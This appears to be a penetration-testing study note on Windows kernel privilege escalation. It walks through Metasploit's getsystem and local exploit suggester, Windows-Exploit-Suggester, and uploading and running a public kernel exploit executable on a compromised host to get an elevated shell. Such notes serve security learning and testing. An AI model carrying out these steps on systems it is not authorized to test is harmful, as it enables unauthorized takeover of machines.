
## Privilege Escalation - Kernel Exploits

> Kernel is the core of the operating system and has complete control over every resource and hardware. It stands between hardware and software and facilitates the communication between the.
> 
> Windows NT is the kernel of Windows OS.
> 
> It has two main modes of operation:
> 
> *   User mode. Programs and services running in user mode have limited access to system resources and functuinality.
> *   Kernel Mode. Unrestricted access with the added fucntionality of managing devices and system memory.

## Tools:

*   [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) . This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
*   [Windows-Kernel-Exploits](https://github.com/SecWiki/windows-kernel-exploits) . Collection of Windows Kernel exploits sorted by CVE.

## Using Metasploit

Afer getting access to the system and have a meterpreter session.

First, try use an inbuilt meterpreter command that allows us to automatically elevate our privileges on the target

```plaintext
getsystem
```

If that failed, put the session in the background and use a module that will enumerate all vulnerabilities for this target.

It will provide us with a list of exploits that are available to elevate our privileges on the target system.

```plaintext
search suggester
use
options
set SESSION
run
```

## Using [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 

get information about the OS.

from meterpreter session:

```plaintext
shell
systeminfo
```

copy the information and paste it in a new file(like infosys.txt) on your system. Let's say you are saving it on your Desktop.

navigate to where windows-exploit-suggester was cloned

first update the vulnerability database

```plaintext
./windows-exploit-suggester.py
```

run the script -

```plaintext
./windows-exploit-suggester.py --database 2023-……xls --systeminfo ~/Desktop/infosys.txt
```

 Identify an exploit \[E\] and look for it in [Windows-Kernel-Exploits](https://github.com/SecWiki/windows-kernel-exploits) 

Download .exe file and transfer it to the target system Temp folder and execute it there. It may be blocked by antivirus.

```plaintext
meterpreter:
cd Temp:\\
ls
upload ~/Dwonloads/67...exe
shell
dir
```

execute the .exe file

```plaintext
.\67....exe
```

a list of versions to choose for and their corresponding number. run again:

```plaintext
.\67....exe 7
```

Now we should have a cmd session with elevated privileges.
